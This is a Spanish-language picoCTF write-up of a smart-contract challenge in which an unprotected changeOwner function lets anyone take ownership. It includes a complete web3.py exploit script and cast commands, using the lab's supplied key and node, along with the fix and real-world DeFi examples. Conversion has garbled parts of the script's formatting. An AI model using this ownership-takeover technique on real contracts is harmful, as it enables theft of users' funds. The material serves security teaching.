# Writeup: Access_Control
**Categoría:** Medium
**Fecha de conversión:** 2026-05-04

---

Writeup: Access Control (picoCTF)

1. ¿Qué es un smart contract?

Un smart contract (contrato inteligente) es un programa que vive en una blockchain como Ethereum. Tiene dirección propia, puede almacenar datos (como variables) y ejecutar funciones cuando alguien interactúa con él. Cada operación que modifica su estado requiere pagar una pequeña comisión en gas (ETH).

2. Contexto del desafío

Se nos da un contrato llamado AccessControl que guarda una flag secreta. Solo el propietario del contrato puede revelarla. Inicialmente, el propietario es quien desplegó el contrato (no nosotros). El objetivo es convertirnos en propietarios y obtener la flag.

3. Código del contrato y análisis
solidity


pragma solidity ^0.8.0;


contract AccessControl {

```
    address public owner;       // dirección del propietario
    string private flag;        // flag secreta (privada)
    bool public revealed;       // indica si ya se reveló

    event OwnerChanged(address indexed oldOwner, address indexed newOwner);
    event FlagRevealed(string flag);

    constructor(string memory _flag) {
        owner = msg.sender;     // quien despliega el contrato es el owner
        flag = _flag;
        revealed = false;
    }

    function changeOwner(address _newOwner) public {
        address oldOwner = owner;
        owner = _newOwner;
        emit OwnerChanged(oldOwner, _newOwner);
    }

    function solve() public {
        require(msg.sender == owner, "Only the owner can get the flag.");
        if (!revealed) {
            revealed = true;
            emit FlagRevealed(flag);
        }
    }

    function getFlag() public view returns (string memory) {
        require(revealed, "Challenge not yet solved!");
        return flag;
    }
```

}


### Explicación línea por línea


```
    owner: Almacena la dirección del dueño. Es public, así que cualquiera puede consultarla.

    flag: private significa que teóricamente solo el contrato puede acceder a ella, pero en blockchain los datos privados son legibles desde el almacenamiento. De todas formas, aquí se revela mediante evento.

    revealed: Booleano que impide leer la flag hasta que no se llame a solve().

    constructor: Se ejecuta una sola vez al desplegar. Guarda la flag y asigna owner como quien creó el contrato.

    changeOwner: Cambia el propietario. No hay ninguna restricción → cualquiera puede llamarla y ponerse como owner.

    solve: Solo el owner puede llamarla. Si aún no se ha revelado, cambia revealed a true y emite un evento con la flag.

    getFlag: Función de solo lectura (view). Devuelve la flag si revealed es true.

```

4. Vulnerabilidad

La función changeOwner no verifica que quien la llama sea el propietario actual. Esto permite que cualquier persona se convierta en el nuevo owner.


Consecuencia: Podemos llamar a changeOwner con nuestra dirección, volvernos owner, después llamar a solve() (ahora somos el owner) y finalmente leer la flag con getFlag().

5. Entorno proporcionado

```
    Dirección del contrato: 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9

    Nuestra clave privada: 0xb938de612b9e794a0c612c2358d22aa2d3da8719dd31681b170ae0517cae0e27

    Nuestra dirección pública: 0xfe6B08cec6f79Cc17D1E6dC2995B5e53d5F95FB7

    Saldo: 5 ETH (suficiente para pagar el gas)

    Nodo RPC: http://lonely-island.picoctf.net:52893/ (así nos conectamos a la red donde está el contrato)

```

6. ¿Qué necesitamos para interactuar?

Podemos usar Python con la librería web3.py. Es la forma más sencilla para principiantes.

Instalación de web3.py

bash


pip install web3


7. Código del exploit explicado línea por línea

Crearemos un archivo exploit.py con el siguiente contenido:

python


```bash
#!/usr/bin/env python3
```

from web3 import Web3


```bash
# =================== DATOS DEL DESAFÍO ===================
```

RPC_URL = "http://lonely-island.picoctf.net:52893/"

PRIVATE_KEY = "0xb938de612b9e794a0c612c2358d22aa2d3da8719dd31681b170ae0517cae0e27"

CONTRACT_ADDRESS = "0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9"

MY_ADDRESS = "0xfe6B08cec6f79Cc17D1E6dC2995B5e53d5F95FB7"


```bash
# ABI mínimo (solo las funciones que usamos)
```

## Abi = [

```
    {"inputs":[{"internalType":"address","name":"_newOwner","type":"address"}],"name":"changeOwner","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"solve","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"getFlag","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}
```

]


```bash
# =================== CONEXIÓN ===================
```

```bash
# Conectamos al nodo RPC
```

w3 = Web3(Web3.HTTPProvider(RPC_URL))


```bash
# Verificamos que la conexión sea exitosa
```

assert w3.is_connected(), "No se pudo conectar al RPC"


```bash
# Creamos un objeto "account" con nuestra clave privada
```

account = w3.eth.account.from_key(PRIVATE_KEY)


```bash
# Asociamos el contrato con su dirección y ABI
```

contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)


```bash
# =================== PASO 1: Cambiar owner ===================
```

print("[1] Cambiando owner...")


```bash
# Construimos la transacción que llama a changeOwner(MY_ADDRESS)
```

tx = contract.functions.changeOwner(MY_ADDRESS).build_transaction({

```
    'from': MY_ADDRESS,                         # Remitente (nosotros)
    'nonce': w3.eth.get_transaction_count(MY_ADDRESS),  # Número de transacción (0,1,2,...)
    'gas': 200000,                              # Límite de gas
    'gasPrice': w3.eth.gas_price                # Precio del gas actual
```

})


```bash
# Firmamos la transacción con nuestra clave privada (demostramos que somos dueños de la dirección)
```

signed = account.sign_transaction(tx)


```bash
# Enviamos la transacción a la red
```

tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)


```bash
# Esperamos a que se confirme (se mine)
```

w3.eth.wait_for_transaction_receipt(tx_hash)


print("    Hecho. Hash de la transacción:", tx_hash.hex())


```bash
# =================== PASO 2: Revelar flag (solve) ===================
```

print("[2] Revelando flag...")


```bash
# Otra transacción, esta vez sin argumentos
```

tx = contract.functions.solve().build_transaction({

```
    'from': MY_ADDRESS,
    'nonce': w3.eth.get_transaction_count(MY_ADDRESS),  # El nonce se incrementa automáticamente
    'gas': 200000,
    'gasPrice': w3.eth.gas_price
```

})


signed = account.sign_transaction(tx)

tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)

w3.eth.wait_for_transaction_receipt(tx_hash)


print("    Hecho. Hash:", tx_hash.hex())


```bash
# =================== PASO 3: Leer la flag ===================
```

print("[3] Obteniendo flag...")


```bash
# Llamada de solo lectura (no requiere firma ni gas, se consulta directamente)
```

### flag = contract.functions.getFlag().call()


print(f"\n🏁 **FLAG**: {flag}")


¿Qué hace cada parte?


```
    Web3(HTTPProvider(RPC_URL)): Abre un canal de comunicación con la blockchain a través de la URL dada.

    w3.eth.account.from_key(PRIVATE_KEY): Crea un objeto que representa nuestra cuenta (con nuestra dirección y la capacidad de firmar).

    contract.functions.funcion(...): Prepara la llamada a una función del contrato.

    build_transaction({...}): Construye una transacción con todos los parámetros necesarios (origen, gas, etc.).

    account.sign_transaction(tx): Firma la transacción con nuestra clave privada. Sin firma, la red rechazaría la transacción.

    w3.eth.send_raw_transaction(...): Envía la transacción firmada al nodo para que sea procesada.

    w3.eth.wait_for_transaction_receipt(...): Espera a que la transacción sea incluida en un bloque. Es importante para asegurar que se ejecutó correctamente.

    contract.functions.getFlag().call(): Ejecuta una función view (solo lectura) que no modifica el estado. No requiere gas ni firma, simplemente consulta.

```

8. Ejecución y resultado
bash


```bash
$ python3 exploit.py
```

[1] Cambiando owner...

```
    Hecho. Hash: 0x9bcdcf081e3a3b86a9439eac7c553c53249772f252f4504d960dfb53ed1b1048
```

[2] Revelando flag...

```
    Hecho. Hash: 0x8422b91aaca0cd996e7851ad75f46840e5e140964315665648bdd3314b56dbf5
```

[3] Obteniendo flag...


🏁 **FLAG**: picoCTF{**************************}


9. Explicación de por qué la vulnerabilidad existe

El desarrollador asumió que solo el owner podría llamar a changeOwner, pero olvidó agregar la línea:

solidity


require(msg.sender == owner, "Only current owner can change owner");


Sin esa validación, cualquiera puede ejecutar changeOwner y reasignar el propietario.

10. ¿Cómo se corrige?
solidity


function changeOwner(address _newOwner) public {

```
    require(msg.sender == owner, "Not authorized");
    emit OwnerChanged(owner, _newOwner);
    owner = _newOwner;
```

}


11. Lecciones aprendidas

```
    Siempre validar permisos: Las funciones críticas deben tener require que compruebe el rol del llamador.

    No confiar en que nadie más llamará a una función: En blockchain, cualquiera puede interactuar con el contrato.

    Los eventos no son secretos: Aunque la flag se emite en un evento, cualquiera que escuche la red puede verla. En este caso la leemos con getFlag() directamente.

    El almacenamiento private no es realmente privado: Los datos se guardan en el estado de la blockchain y se pueden leer con herramientas como cast storage o web3.eth.get_storage_at. Pero aquí no fue necesario.

```

12. Variante usando cast (opcional)

Si tuvieras instalado Foundry (cast), los comandos serían:

bash


cast send 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9 "changeOwner(address)" 0xfe6B08cec6f79Cc17D1E6dC2995B5e53d5F95FB7 --rpc-url http://lonely-island.picoctf.net:52893/ --private-key 0xb938de612b9e794a0c612c2358d22aa2d3da8719dd31681b170ae0517cae0e27

cast send 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9 "solve()" --rpc-url ... (mismo)

cast call 0x6D8da4B12D658a36909ec1C75F81E54B8DB4eBf9 "getFlag()(string)" --rpc-url ...


13. Conclusión

Este CTF enseña un error de control de acceso extremadamente común en contratos simples. Con una sola transacción mal protegida, perdemos todo el sentido de propiedad. Es un recordatorio para revisar cada función que modifica el estado y asegurarse de que solo pueda ser llamada por quienes deben hacerlo.


Repercusión en la vida real


La vulnerabilidad que has visto en el CTF (falta de control de acceso en changeOwner) no es solo un ejercicio académico. En el mundo real de los contratos inteligentes y las blockchains, este tipo de error tiene consecuencias graves:

1. Pérdida total de control del contrato

```
    Ejemplo real: Un contrato DeFi (finanzas descentralizadas) con una función changeOwner sin protección permitiría a un atacante convertirse en propietario. Una vez propietario, podría:

        Cambiar la lógica del contrato (si es actualizable).

        Retirar fondos de pools de liquidez o tesorerías.

        Acuñar tokens sin límite.

        Pausar o bloquear operaciones.

```

2. Robo de fondos o tokens

```
    Caso concreto: En 2017, el contrato Parity Wallet tuvo un error similar en una función initWallet que permitía a cualquiera convertirse en propietario y después drenar fondos. Se perdieron más de 150,000 ETH (≈ $30 millones en ese momento). Aunque el mecanismo fue distinto, la raíz fue la misma: falta de verificación de identidad.

```

3. Vulnerabilidad en contratos de gobernanza

```
    Muchos protocolos DAO tienen un rol de "owner" que puede proponer votaciones o ejecutar cambios. Si cualquiera puede asumir ese rol, puede manipular la gobernanza, aprobar gastos indebidos o robar el tesoro.

```

4. Ataques en cadena de suministro (librerías)

```
    Contratos que heredan de bibliotecas con funciones onlyOwner mal implementadas. Un atacante podría tomar el control de una biblioteca base y afectar todos los contratos que la usan.

```

5. Impacto en contratos de custodia y multisig

```
    Si un contrato de custodia (por ejemplo, para un exchange descentralizado) tiene una función changeOwner sin restricciones, el atacante puede cambiar el owner y luego aprobar cualquier transacción, vaciando los fondos de los usuarios.

```

6. ¿Por qué sucede esto en la realidad?

```
    Falta de auditorías (muchos proyectos pequeños no auditan).

    Código copiado de foros o tutoriales que omiten el require.

    Equívocos sobre msg.sender: el desarrollador asume que la función solo la llamará el owner porque está "oculta" en la interfaz, pero en blockchain cualquiera puede llamar cualquier función pública.

    Pruebas insuficientes: no se testea el escenario de ataque.

```

7. Estadísticas reales

```
    Según Immunefi (plataforma de recompensas por bugs), los errores de control de acceso representan el 20-25% de los hackeos graves en DeFi. Ejemplos:

        SushiSwap (2020): vulnerabilidad en Migrator que permitía robar fondos. No era exactamente changeOwner, pero similar.

        Paid Network (2021): atacante mintó $160M en tokens porque una función sin restricciones permitía acuñar.

        Compound (2021): error de administración de "admin" que casi permite drenar fondos.

```

8. Consecuencias legales y reputacionales

```
    Los proyectos que sufren este tipo de ataques suelen perder la confianza de los usuarios, el valor de su token se desploma y, en algunos casos, enfrentan demandas.

    En el mundo real, no hay una autoridad central que pueda revertir las transacciones (salvo hard forks, rarísimos). Lo robado se pierde para siempre.

```

Resumen para tu aprendizaje


Lo que en el CTF parece un simple changeOwner sin restricciones y una flag de texto, en la vida real es una puerta abierta a desastres financieros. Por eso en todos los contratos serios se usan patrones como OpenZeppelin’s Ownable:

solidity


import "@openzeppelin/contracts/access/Ownable.sol";

contract AccessControl is Ownable {

```
    // now onlyOwner can call changeOwner
```

}


O se implementa manualmente el require(msg.sender == owner).


Siempre que escribas una función que modifique el propietario, administrador o cualquier rol crítico, pregúntate: ¿quién debería poder llamar esto? Si la respuesta no es "cualquiera", entonces añade una validación.

